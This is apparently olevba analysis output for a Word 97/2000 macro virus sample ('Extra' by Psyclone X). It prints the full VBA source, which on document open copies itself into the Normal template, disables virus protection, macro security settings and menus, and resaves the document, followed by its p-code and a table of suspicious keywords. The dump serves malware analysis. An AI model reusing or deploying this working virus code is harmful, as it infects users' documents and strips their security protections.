olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Onex.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
End
Attribute VB_Name = "Extra"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
 On Error Resume Next
 Set c = New DataObject
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
   ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
   c.SetText Extra.VBProject.VBComponents(1).CodeModule.lines(1, Extra.VBProject.VBComponents(1).CodeModule.countoflines)
   .CodeModule.deletelines 1, .CodeModule.countoflines
   .CodeModule.insertlines 1, c.GetText
   .Name = "Extra"
  End With
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
' Word 97/2k.Extra - Psyclone X
' My first virus for the year 2k
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8536 bytes
' Line #0:
' 	Reparse 0x0011 "VERSION 1.0 CLASS"
' Line #1:
' 	ArgsCall BEGIN 0x0000 
' Line #2:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiUse 
' 	QuoteRem 0x0011 0x0004 "True"
' Line #3:
' 	End 
' Line #4:
' 	Reparse 0x001B "Attribute VB_Name = "Extra""
' Line #5:
' 	Reparse 0x0024 "Attribute VB_GlobalNameSpace = False"
' Line #6:
' 	Reparse 0x001E "Attribute VB_Creatable = False"
' Line #7:
' 	Reparse 0x0021 "Attribute VB_PredeclaredId = True"
' Line #8:
' 	Reparse 0x001B "Attribute VB_Exposed = True"
' Line #9:
' 	FuncDefn (Private Sub Document_Open())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	SetStmt 
' 	New <crash>
' 	Set c 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #14:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	ElseIfBlock 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartWithExpr 
' 	Ld GoSub 
' 	With 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld c 
' 	ArgsMemCall SetText 0x0001 
' Line #20:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd countoflines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd GetText 
' 	MemLdWith CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #22:
' 	LitStr 0x0005 "Extra"
' 	MemStWith New 
' Line #23:
' 	EndWith 
' Line #24:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #26:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #29:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #32:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x001E " Word 97/2k.Extra - Psyclone X"
' Line #35:
' 	QuoteRem 0x0000 0x001F " My first virus for the year 2k"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

